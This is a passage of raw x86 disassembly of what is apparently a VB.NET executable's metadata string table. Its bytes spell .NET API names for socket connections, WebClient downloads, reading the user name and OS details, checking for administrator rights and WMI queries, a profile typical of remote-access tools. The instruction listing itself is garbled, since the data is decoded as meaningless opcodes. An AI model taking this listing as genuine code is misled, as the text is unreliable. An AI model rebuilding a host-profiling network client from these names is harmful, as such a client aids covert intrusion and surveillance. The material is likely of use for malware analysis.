  407af9:	70 69                	jo     0x407b64
  407afb:	6c                   	insb   (%dx),%es:(%edi)
  407afc:	65 72 53             	gs jb  0x407b52
  407aff:	65 72 76             	gs jb  0x407b78
  407b02:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  407b09:	6e                   	outsb  %ds:(%esi),(%dx)
  407b0a:	74 69                	je     0x407b75
  407b0c:	6d                   	insl   (%dx),%es:(%edi)
  407b0d:	65 48                	gs dec %eax
  407b0f:	65 6c                	gs insb (%dx),%es:(%edi)
  407b11:	70 65                	jo     0x407b78
  407b13:	72 73                	jb     0x407b88
  407b15:	00 47 65             	add    %al,0x65(%edi)
  407b18:	74 4f                	je     0x407b69
  407b1a:	62 6a 65             	bound  %ebp,0x65(%edx)
  407b1d:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  407b21:	6c                   	insb   (%dx),%es:(%edi)
  407b22:	75 65                	jne    0x407b89
  407b24:	00 52 75             	add    %dl,0x75(%edx)
  407b27:	6e                   	outsb  %ds:(%esi),(%dx)
  407b28:	74 69                	je     0x407b93
  407b2a:	6d                   	insl   (%dx),%es:(%edi)
  407b2b:	65 54                	gs push %esp
  407b2d:	79 70                	jns    0x407b9f
  407b2f:	65 48                	gs dec %eax
  407b31:	61                   	popa
  407b32:	6e                   	outsb  %ds:(%esi),(%dx)
  407b33:	64 6c                	fs insb (%dx),%es:(%edi)
  407b35:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407b39:	74 54                	je     0x407b8f
  407b3b:	79 70                	jns    0x407bad
  407b3d:	65 46                	gs inc %esi
  407b3f:	72 6f                	jb     0x407bb0
  407b41:	6d                   	insl   (%dx),%es:(%edi)
  407b42:	48                   	dec    %eax
  407b43:	61                   	popa
  407b44:	6e                   	outsb  %ds:(%esi),(%dx)
  407b45:	64 6c                	fs insb (%dx),%es:(%edi)
  407b47:	65 00 41 63          	add    %al,%gs:0x63(%ecx)
  407b4b:	74 69                	je     0x407bb6
  407b4d:	76 61                	jbe    0x407bb0
  407b4f:	74 6f                	je     0x407bc0
  407b51:	72 00                	jb     0x407b53
  407b53:	43                   	inc    %ebx
  407b54:	72 65                	jb     0x407bbb
  407b56:	61                   	popa
  407b57:	74 65                	je     0x407bbe
  407b59:	49                   	dec    %ecx
  407b5a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5b:	73 74                	jae    0x407bd1
  407b5d:	61                   	popa
  407b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5f:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b62:	4d                   	dec    %ebp
  407b63:	79 47                	jns    0x407bac
  407b65:	72 6f                	jb     0x407bd6
  407b67:	75 70                	jne    0x407bd9
  407b69:	43                   	inc    %ebx
  407b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6b:	6c                   	insb   (%dx),%es:(%edi)
  407b6c:	6c                   	insb   (%dx),%es:(%edi)
  407b6d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407b72:	6e                   	outsb  %ds:(%esi),(%dx)
  407b73:	41                   	inc    %ecx
  407b74:	74 74                	je     0x407bea
  407b76:	72 69                	jb     0x407be1
  407b78:	62 75 74             	bound  %esi,0x74(%ebp)
  407b7b:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407b7f:	73 74                	jae    0x407bf5
  407b81:	65 6d                	gs insl (%dx),%es:(%edi)
  407b83:	2e 52                	cs push %edx
  407b85:	75 6e                	jne    0x407bf5
  407b87:	74 69                	je     0x407bf2
  407b89:	6d                   	insl   (%dx),%es:(%edi)
  407b8a:	65 2e 49             	gs cs dec %ecx
  407b8d:	6e                   	outsb  %ds:(%esi),(%dx)
  407b8e:	74 65                	je     0x407bf5
  407b90:	72 6f                	jb     0x407c01
  407b92:	70 53                	jo     0x407be7
  407b94:	65 72 76             	gs jb  0x407c0d
  407b97:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407b9e:	6d                   	insl   (%dx),%es:(%edi)
  407b9f:	56                   	push   %esi
  407ba0:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407ba7:	74 74                	je     0x407c1d
  407ba9:	72 69                	jb     0x407c14
  407bab:	62 75 74             	bound  %esi,0x74(%ebp)
  407bae:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
  407bb3:	65 61                	gs popa
  407bb5:	64 53                	fs push %ebx
  407bb7:	74 61                	je     0x407c1a
  407bb9:	74 69                	je     0x407c24
  407bbb:	63 41 74             	arpl   %eax,0x74(%ecx)
  407bbe:	74 72                	je     0x407c32
  407bc0:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  407bc7:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc8:	6d                   	insl   (%dx),%es:(%edi)
  407bc9:	70 69                	jo     0x407c34
  407bcb:	6c                   	insb   (%dx),%es:(%edi)
  407bcc:	65 72 47             	gs jb  0x407c16
  407bcf:	65 6e                	outsb  %gs:(%esi),(%dx)
  407bd1:	65 72 61             	gs jb  0x407c35
  407bd4:	74 65                	je     0x407c3b
  407bd6:	64 41                	fs inc %ecx
  407bd8:	74 74                	je     0x407c4e
  407bda:	72 69                	jb     0x407c45
  407bdc:	62 75 74             	bound  %esi,0x74(%ebp)
  407bdf:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  407be3:	74 65                	je     0x407c4a
  407be5:	72 61                	jb     0x407c48
  407be7:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  407beb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bec:	00 45 6e             	add    %al,0x6e(%ebp)
  407bef:	76 69                	jbe    0x407c5a
  407bf1:	72 6f                	jb     0x407c62
  407bf3:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf4:	00 53 74             	add    %dl,0x74(%ebx)
  407bf7:	72 69                	jb     0x407c62
  407bf9:	6e                   	outsb  %ds:(%esi),(%dx)
  407bfa:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  407bfe:	6e                   	outsb  %ds:(%esi),(%dx)
  407bff:	63 61 74             	arpl   %esp,0x74(%ecx)
  407c02:	00 56 42             	add    %dl,0x42(%esi)
  407c05:	24 41                	and    $0x41,%al
  407c07:	6e                   	outsb  %ds:(%esi),(%dx)
  407c08:	6f                   	outsl  %ds:(%esi),(%dx)
  407c09:	6e                   	outsb  %ds:(%esi),(%dx)
  407c0a:	79 6d                	jns    0x407c79
  407c0c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c0d:	75 73                	jne    0x407c82
  407c0f:	44                   	inc    %esp
  407c10:	65 6c                	gs insb (%dx),%es:(%edi)
  407c12:	65 67 61             	gs addr16 popa
  407c15:	74 65                	je     0x407c7c
  407c17:	5f                   	pop    %edi
  407c18:	30 00                	xor    %al,(%eax)
  407c1a:	5f                   	pop    %edi
  407c1b:	4c                   	dec    %esp
  407c1c:	61                   	popa
  407c1d:	6d                   	insl   (%dx),%es:(%edi)
  407c1e:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407c22:	5f                   	pop    %edi
  407c23:	5f                   	pop    %edi
  407c24:	31 00                	xor    %eax,(%eax)
  407c26:	5f                   	pop    %edi
  407c27:	4c                   	dec    %esp
  407c28:	61                   	popa
  407c29:	6d                   	insl   (%dx),%es:(%edi)
  407c2a:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407c2e:	5f                   	pop    %edi
  407c2f:	5f                   	pop    %edi
  407c30:	32 00                	xor    (%eax),%al
  407c32:	5f                   	pop    %edi
  407c33:	4c                   	dec    %esp
  407c34:	61                   	popa
  407c35:	6d                   	insl   (%dx),%es:(%edi)
  407c36:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407c3a:	5f                   	pop    %edi
  407c3b:	5f                   	pop    %edi
  407c3c:	33 00                	xor    (%eax),%eax
  407c3e:	44                   	inc    %esp
  407c3f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407c43:	67 65 72 44          	addr16 gs jb 0x407c8b
  407c47:	69 73 70 6c 61 79 41 	imul   $0x4179616c,0x70(%ebx),%esi
  407c4e:	74 74                	je     0x407cc4
  407c50:	72 69                	jb     0x407cbb
  407c52:	62 75 74             	bound  %esi,0x74(%ebp)
  407c55:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407c5a:	75 67                	jne    0x407cc3
  407c5c:	67 65 72 53          	addr16 gs jb 0x407cb3
  407c60:	74 65                	je     0x407cc7
  407c62:	70 54                	jo     0x407cb8
  407c64:	68 72 6f 75 67       	push   $0x67756f72
  407c69:	68 41 74 74 72       	push   $0x72747441
  407c6e:	69 62 75 74 65 00 45 	imul   $0x45006574,0x75(%edx),%esp
  407c75:	78 63                	js     0x407cda
  407c77:	65 70 74             	gs jo  0x407cee
  407c7a:	69 6f 6e 00 43 6f 6e 	imul   $0x6e6f4300,0x6e(%edi),%ebp
  407c81:	76 65                	jbe    0x407ce8
  407c83:	72 73                	jb     0x407cf8
  407c85:	69 6f 6e 73 00 50 72 	imul   $0x72500073,0x6e(%edi),%ebp
  407c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c8d:	6a 65                	push   $0x65
  407c8f:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  407c93:	74 61                	je     0x407cf6
  407c95:	00 53 65             	add    %dl,0x65(%ebx)
  407c98:	74 50                	je     0x407cea
  407c9a:	72 6f                	jb     0x407d0b
  407c9c:	6a 65                	push   $0x65
  407c9e:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  407ca2:	72 6f                	jb     0x407d13
  407ca4:	72 00                	jb     0x407ca6
  407ca6:	45                   	inc    %ebp
  407ca7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca8:	76 69                	jbe    0x407d13
  407caa:	72 6f                	jb     0x407d1b
  407cac:	6e                   	outsb  %ds:(%esi),(%dx)
  407cad:	6d                   	insl   (%dx),%es:(%edi)
  407cae:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cb0:	74 00                	je     0x407cb2
  407cb2:	45                   	inc    %ebp
  407cb3:	78 69                	js     0x407d1e
  407cb5:	74 00                	je     0x407cb7
  407cb7:	43                   	inc    %ebx
  407cb8:	6c                   	insb   (%dx),%es:(%edi)
  407cb9:	65 61                	gs popa
  407cbb:	72 50                	jb     0x407d0d
  407cbd:	72 6f                	jb     0x407d2e
  407cbf:	6a 65                	push   $0x65
  407cc1:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  407cc5:	72 6f                	jb     0x407d36
  407cc7:	72 00                	jb     0x407cc9
  407cc9:	43                   	inc    %ebx
  407cca:	68 61 72 00 53       	push   $0x53007261
  407ccf:	70 6c                	jo     0x407d3d
  407cd1:	69 74 00 54 68 72 65 	imul   $0x61657268,0x54(%eax,%eax,1),%esi
  407cd8:	61 
  407cd9:	64 53                	fs push %ebx
  407cdb:	74 61                	je     0x407d3e
  407cdd:	72 74                	jb     0x407d53
  407cdf:	00 53 74             	add    %dl,0x74(%ebx)
  407ce2:	61                   	popa
  407ce3:	72 74                	jb     0x407d59
  407ce5:	00 4a 6f             	add    %cl,0x6f(%edx)
  407ce8:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  407cef:	65 6d                	gs insl (%dx),%es:(%edi)
  407cf1:	2e 4e                	cs dec %esi
  407cf3:	65 74 00             	gs je  0x407cf6
  407cf6:	57                   	push   %edi
  407cf7:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  407cfb:	69 65 6e 74 00 53 65 	imul   $0x65530074,0x6e(%ebp),%esp
  407d02:	72 76                	jb     0x407d7a
  407d04:	69 63 65 50 6f 69 6e 	imul   $0x6e696f50,0x65(%ebx),%esp
  407d0b:	74 4d                	je     0x407d5a
  407d0d:	61                   	popa
  407d0e:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0f:	61                   	popa
  407d10:	67 65 72 00          	addr16 gs jb 0x407d14
  407d14:	73 65                	jae    0x407d7b
  407d16:	74 5f                	je     0x407d77
  407d18:	45                   	inc    %ebp
  407d19:	78 70                	js     0x407d8b
  407d1b:	65 63 74 31 30       	arpl   %esi,%gs:0x30(%ecx,%esi,1)
  407d20:	30 43 6f             	xor    %al,0x6f(%ebx)
  407d23:	6e                   	outsb  %ds:(%esi),(%dx)
  407d24:	74 69                	je     0x407d8f
  407d26:	6e                   	outsb  %ds:(%esi),(%dx)
  407d27:	75 65                	jne    0x407d8e
  407d29:	00 53 65             	add    %dl,0x65(%ebx)
  407d2c:	63 75 72             	arpl   %esi,0x72(%ebp)
  407d2f:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  407d36:	6f 
  407d37:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407d3a:	54                   	push   %esp
  407d3b:	79 70                	jns    0x407dad
  407d3d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407d41:	74 5f                	je     0x407da2
  407d43:	53                   	push   %ebx
  407d44:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407d48:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  407d4f:	6f 
  407d50:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407d53:	00 73 65             	add    %dh,0x65(%ebx)
  407d56:	74 5f                	je     0x407db7
  407d58:	44                   	inc    %esp
  407d59:	65 66 61             	gs popaw
  407d5c:	75 6c                	jne    0x407dca
  407d5e:	74 43                	je     0x407da3
  407d60:	6f                   	outsl  %ds:(%esi),(%dx)
  407d61:	6e                   	outsb  %ds:(%esi),(%dx)
  407d62:	6e                   	outsb  %ds:(%esi),(%dx)
  407d63:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407d68:	6e                   	outsb  %ds:(%esi),(%dx)
  407d69:	4c                   	dec    %esp
  407d6a:	69 6d 69 74 00 44 6f 	imul   $0x6f440074,0x69(%ebp),%ebp
  407d71:	77 6e                	ja     0x407de1
  407d73:	6c                   	insb   (%dx),%es:(%edi)
  407d74:	6f                   	outsl  %ds:(%esi),(%dx)
  407d75:	61                   	popa
  407d76:	64 53                	fs push %ebx
  407d78:	74 72                	je     0x407dec
  407d7a:	69 6e 67 00 49 44 69 	imul   $0x69444900,0x67(%esi),%ebp
  407d81:	73 70                	jae    0x407df3
  407d83:	6f                   	outsl  %ds:(%esi),(%dx)
  407d84:	73 61                	jae    0x407de7
  407d86:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407d8a:	44                   	inc    %esp
  407d8b:	69 73 70 6f 73 65 00 	imul   $0x65736f,0x70(%ebx),%esi
  407d92:	4e                   	dec    %esi
  407d93:	65 78 74             	gs js  0x407e0a
  407d96:	00 57 61             	add    %dl,0x61(%edi)
  407d99:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407da0:	65 
  407da1:	00 57 61             	add    %dl,0x61(%edi)
  407da4:	69 74 4f 6e 65 00 53 	imul   $0x54530065,0x6e(%edi,%ecx,2),%esi
  407dab:	54 
  407dac:	41                   	inc    %ecx
  407dad:	54                   	push   %esp
  407dae:	68 72 65 61 64       	push   $0x64616572
  407db3:	41                   	inc    %ecx
  407db4:	74 74                	je     0x407e2a
  407db6:	72 69                	jb     0x407e21
  407db8:	62 75 74             	bound  %esi,0x74(%ebp)
  407dbb:	65 00 5f 4c          	add    %bl,%gs:0x4c(%edi)
  407dbf:	61                   	popa
  407dc0:	6d                   	insl   (%dx),%es:(%edi)
  407dc1:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407dc5:	5f                   	pop    %edi
  407dc6:	5f                   	pop    %edi
  407dc7:	34 00                	xor    $0x0,%al
  407dc9:	61                   	popa
  407dca:	30 00                	xor    %al,(%eax)
  407dcc:	5f                   	pop    %edi
  407dcd:	4c                   	dec    %esp
  407dce:	61                   	popa
  407dcf:	6d                   	insl   (%dx),%es:(%edi)
  407dd0:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407dd4:	5f                   	pop    %edi
  407dd5:	5f                   	pop    %edi
  407dd6:	35 00 54 69 6d       	xor    $0x6d695400,%eax
  407ddb:	65 72 43             	gs jb  0x407e21
  407dde:	61                   	popa
  407ddf:	6c                   	insb   (%dx),%es:(%edi)
  407de0:	6c                   	insb   (%dx),%es:(%edi)
  407de1:	62 61 63             	bound  %esp,0x63(%ecx)
  407de4:	6b 00 41             	imul   $0x41,(%eax),%eax
  407de7:	64 64 72 65          	fs fs jb 0x407e50
  407deb:	73 73                	jae    0x407e60
  407ded:	46                   	inc    %esi
  407dee:	61                   	popa
  407def:	6d                   	insl   (%dx),%es:(%edi)
  407df0:	69 6c 79 00 53 6f 63 	imul   $0x6b636f53,0x0(%ecx,%edi,2),%ebp
  407df7:	6b 
  407df8:	65 74 54             	gs je  0x407e4f
  407dfb:	79 70                	jns    0x407e6d
  407dfd:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407e01:	6f                   	outsl  %ds:(%esi),(%dx)
  407e02:	74 6f                	je     0x407e73
  407e04:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407e07:	54                   	push   %esp
  407e08:	79 70                	jns    0x407e7a
  407e0a:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  407e0e:	74 65                	je     0x407e75
  407e10:	00 73 65             	add    %dh,0x65(%ebx)
  407e13:	74 5f                	je     0x407e74
  407e15:	52                   	push   %edx
  407e16:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  407e1a:	76 65                	jbe    0x407e81
  407e1c:	42                   	inc    %edx
  407e1d:	75 66                	jne    0x407e85
  407e1f:	66 65 72 53          	data16 gs jb 0x407e76
  407e23:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407e2a:	5f                   	pop    %edi
  407e2b:	53                   	push   %ebx
  407e2c:	65 6e                	outsb  %gs:(%esi),(%dx)
  407e2e:	64 42                	fs inc %edx
  407e30:	75 66                	jne    0x407e98
  407e32:	66 65 72 53          	data16 gs jb 0x407e89
  407e36:	69 7a 65 00 54 6f 49 	imul   $0x496f5400,0x65(%edx),%edi
  407e3d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3e:	74 65                	je     0x407ea5
  407e40:	67 65 72 00          	addr16 gs jb 0x407e44
  407e44:	43                   	inc    %ebx
  407e45:	6f                   	outsl  %ds:(%esi),(%dx)
  407e46:	6e                   	outsb  %ds:(%esi),(%dx)
  407e47:	6e                   	outsb  %ds:(%esi),(%dx)
  407e48:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  407e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e4e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407e51:	74 46                	je     0x407e99
  407e53:	6c                   	insb   (%dx),%es:(%edi)
  407e54:	61                   	popa
  407e55:	67 73 00             	addr16 jae 0x407e58
  407e58:	45                   	inc    %ebp
  407e59:	76 65                	jbe    0x407ec0
  407e5b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e5c:	74 57                	je     0x407eb5
  407e5e:	61                   	popa
  407e5f:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e66:	65 
  407e67:	00 53 65             	add    %dl,0x65(%ebx)
  407e6a:	74 00                	je     0x407e6c
  407e6c:	43                   	inc    %ebx
  407e6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6e:	6d                   	insl   (%dx),%es:(%edi)
  407e6f:	70 75                	jo     0x407ee6
  407e71:	74 65                	je     0x407ed8
  407e73:	72 49                	jb     0x407ebe
  407e75:	6e                   	outsb  %ds:(%esi),(%dx)
  407e76:	66 6f                	outsw  %ds:(%esi),(%dx)
  407e78:	00 67 65             	add    %ah,0x65(%edi)
  407e7b:	74 5f                	je     0x407edc
  407e7d:	55                   	push   %ebp
  407e7e:	73 65                	jae    0x407ee5
  407e80:	72 4e                	jb     0x407ed0
  407e82:	61                   	popa
  407e83:	6d                   	insl   (%dx),%es:(%edi)
  407e84:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407e88:	74 5f                	je     0x407ee9
  407e8a:	4f                   	dec    %edi
  407e8b:	53                   	push   %ebx
  407e8c:	46                   	inc    %esi
  407e8d:	75 6c                	jne    0x407efb
  407e8f:	6c                   	insb   (%dx),%es:(%edi)
  407e90:	4e                   	dec    %esi
  407e91:	61                   	popa
  407e92:	6d                   	insl   (%dx),%es:(%edi)
  407e93:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407e97:	70 6c                	jo     0x407f05
  407e99:	61                   	popa
  407e9a:	63 65 00             	arpl   %esp,0x0(%ebp)
  407e9d:	4f                   	dec    %edi
  407e9e:	70 65                	jo     0x407f05
  407ea0:	72 61                	jb     0x407f03
  407ea2:	74 69                	je     0x407f0d
  407ea4:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea5:	67 53                	addr16 push %ebx
  407ea7:	79 73                	jns    0x407f1c
  407ea9:	74 65                	je     0x407f10
  407eab:	6d                   	insl   (%dx),%es:(%edi)
  407eac:	00 67 65             	add    %ah,0x65(%edi)
  407eaf:	74 5f                	je     0x407f10
  407eb1:	4f                   	dec    %edi
  407eb2:	53                   	push   %ebx
  407eb3:	56                   	push   %esi
  407eb4:	65 72 73             	gs jb  0x407f2a
  407eb7:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  407ebe:	5f                   	pop    %edi
  407ebf:	53                   	push   %ebx
  407ec0:	65 72 76             	gs jb  0x407f39
  407ec3:	69 63 65 50 61 63 6b 	imul   $0x6b636150,0x65(%ebx),%esp
  407eca:	00 67 65             	add    %ah,0x65(%edi)
  407ecd:	74 5f                	je     0x407f2e
  407ecf:	49                   	dec    %ecx
  407ed0:	73 36                	jae    0x407f08
  407ed2:	34 42                	xor    $0x42,%al
  407ed4:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  407edb:	74 
  407edc:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  407ee3:	65 6d                	gs insl (%dx),%es:(%edi)
  407ee5:	00 42 6f             	add    %al,0x6f(%edx)
  407ee8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee9:	6c                   	insb   (%dx),%es:(%edi)
  407eea:	65 61                	gs popa
  407eec:	6e                   	outsb  %ds:(%esi),(%dx)
  407eed:	00 46 69             	add    %al,0x69(%esi)
  407ef0:	6c                   	insb   (%dx),%es:(%edi)
  407ef1:	65 49                	gs dec %ecx
  407ef3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ef4:	66 6f                	outsw  %ds:(%esi),(%dx)
  407ef6:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  407efa:	65 54                	gs push %esp
  407efc:	69 6d 65 00 46 69 6c 	imul   $0x6c694600,0x65(%ebp),%ebp
  407f03:	65 53                	gs push %ebx
  407f05:	79 73                	jns    0x407f7a
  407f07:	74 65                	je     0x407f6e
  407f09:	6d                   	insl   (%dx),%es:(%edi)
  407f0a:	49                   	dec    %ecx
  407f0b:	6e                   	outsb  %ds:(%esi),(%dx)
  407f0c:	66 6f                	outsw  %ds:(%esi),(%dx)
  407f0e:	00 67 65             	add    %ah,0x65(%edi)
  407f11:	74 5f                	je     0x407f72
  407f13:	4c                   	dec    %esp
  407f14:	61                   	popa
  407f15:	73 74                	jae    0x407f8b
  407f17:	57                   	push   %edi
  407f18:	72 69                	jb     0x407f83
  407f1a:	74 65                	je     0x407f81
  407f1c:	54                   	push   %esp
  407f1d:	69 6d 65 00 50 61 74 	imul   $0x74615000,0x65(%ebp),%ebp
  407f24:	68 00 47 65 74       	push   $0x74654700
  407f29:	46                   	inc    %esi
  407f2a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f31:	00 
  407f32:	4f                   	dec    %edi
  407f33:	70 65                	jo     0x407f9a
  407f35:	72 61                	jb     0x407f98
  407f37:	74 6f                	je     0x407fa8
  407f39:	72 73                	jb     0x407fae
  407f3b:	00 43 6f             	add    %al,0x6f(%ebx)
  407f3e:	6d                   	insl   (%dx),%es:(%edi)
  407f3f:	70 61                	jo     0x407fa2
  407f41:	72 65                	jb     0x407fa8
  407f43:	53                   	push   %ebx
  407f44:	74 72                	je     0x407fb8
  407f46:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  407f4d:	74 65                	je     0x407fb4
  407f4f:	6d                   	insl   (%dx),%es:(%edi)
  407f50:	2e 53                	cs push %ebx
  407f52:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407f56:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  407f5d:	6e 
  407f5e:	63 69 70             	arpl   %ebp,0x70(%ecx)
  407f61:	61                   	popa
  407f62:	6c                   	insb   (%dx),%es:(%edi)
  407f63:	00 57 69             	add    %dl,0x69(%edi)
  407f66:	6e                   	outsb  %ds:(%esi),(%dx)
  407f67:	64 6f                	outsl  %fs:(%esi),(%dx)
  407f69:	77 73                	ja     0x407fde
  407f6b:	49                   	dec    %ecx
  407f6c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407f6f:	74 69                	je     0x407fda
  407f71:	74 79                	je     0x407fec
  407f73:	00 47 65             	add    %al,0x65(%edi)
  407f76:	74 43                	je     0x407fbb
  407f78:	75 72                	jne    0x407fec
  407f7a:	72 65                	jb     0x407fe1
  407f7c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f7d:	74 00                	je     0x407f7f
  407f7f:	57                   	push   %edi
  407f80:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  407f87:	72 69                	jb     0x407ff2
  407f89:	6e                   	outsb  %ds:(%esi),(%dx)
  407f8a:	63 69 70             	arpl   %ebp,0x70(%ecx)
  407f8d:	61                   	popa
  407f8e:	6c                   	insb   (%dx),%es:(%edi)
  407f8f:	00 57 69             	add    %dl,0x69(%edi)
  407f92:	6e                   	outsb  %ds:(%esi),(%dx)
  407f93:	64 6f                	outsl  %fs:(%esi),(%dx)
  407f95:	77 73                	ja     0x40800a
  407f97:	42                   	inc    %edx
  407f98:	75 69                	jne    0x408003
  407f9a:	6c                   	insb   (%dx),%es:(%edi)
  407f9b:	74 49                	je     0x407fe6
  407f9d:	6e                   	outsb  %ds:(%esi),(%dx)
  407f9e:	52                   	push   %edx
  407f9f:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa0:	6c                   	insb   (%dx),%es:(%edi)
  407fa1:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407fa5:	49                   	dec    %ecx
  407fa6:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa7:	52                   	push   %edx
  407fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa9:	6c                   	insb   (%dx),%es:(%edi)
  407faa:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407fae:	73 74                	jae    0x408024
  407fb0:	65 6d                	gs insl (%dx),%es:(%edi)
  407fb2:	2e 4d                	cs dec %ebp
  407fb4:	61                   	popa
  407fb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407fb6:	61                   	popa
  407fb7:	67 65 6d             	gs insl (%dx),%es:(%di)
  407fba:	65 6e                	outsb  %gs:(%esi),(%dx)
  407fbc:	74 00                	je     0x407fbe
  407fbe:	4d                   	dec    %ebp
  407fbf:	61                   	popa
  407fc0:	6e                   	outsb  %ds:(%esi),(%dx)
  407fc1:	61                   	popa
  407fc2:	67 65 6d             	gs insl (%dx),%es:(%di)
  407fc5:	65 6e                	outsb  %gs:(%esi),(%dx)
  407fc7:	74 4f                	je     0x408018
  407fc9:	62 6a 65             	bound  %ebp,0x65(%edx)
  407fcc:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  407fd0:	61                   	popa
  407fd1:	72 63                	jb     0x408036
  407fd3:	68 65 72 00 4d       	push   $0x4d007265
  407fd8:	61                   	popa
  407fd9:	6e                   	outsb  %ds:(%esi),(%dx)
  407fda:	61                   	popa
  407fdb:	67 65 6d             	gs insl (%dx),%es:(%di)
  407fde:	65 6e                	outsb  %gs:(%esi),(%dx)
  407fe0:	74 42                	je     0x408024
  407fe2:	61                   	popa
  407fe3:	73 65                	jae    0x40804a
  407fe5:	4f                   	dec    %edi
  407fe6:	62 6a 65             	bound  %ebp,0x65(%edx)
  407fe9:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  407fed:	61                   	popa
  407fee:	6e                   	outsb  %ds:(%esi),(%dx)
  407fef:	61                   	popa
  407ff0:	67 65 6d             	gs insl (%dx),%es:(%di)
  407ff3:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ff5:	74 4f                	je     0x408046
  407ff7:	62 6a 65             	bound  %ebp,0x65(%edx)
  407ffa:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  407ffe:	6c                   	insb   (%dx),%es:(%edi)
  407fff:	6c                   	insb   (%dx),%es:(%edi)
  408000:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408005:	6e                   	outsb  %ds:(%esi),(%dx)
  408006:	00 4d 61             	add    %cl,0x61(%ebp)
  408009:	6e                   	outsb  %ds:(%esi),(%dx)
  40800a:	61                   	popa
  40800b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40800e:	65 6e                	outsb  %gs:(%esi),(%dx)
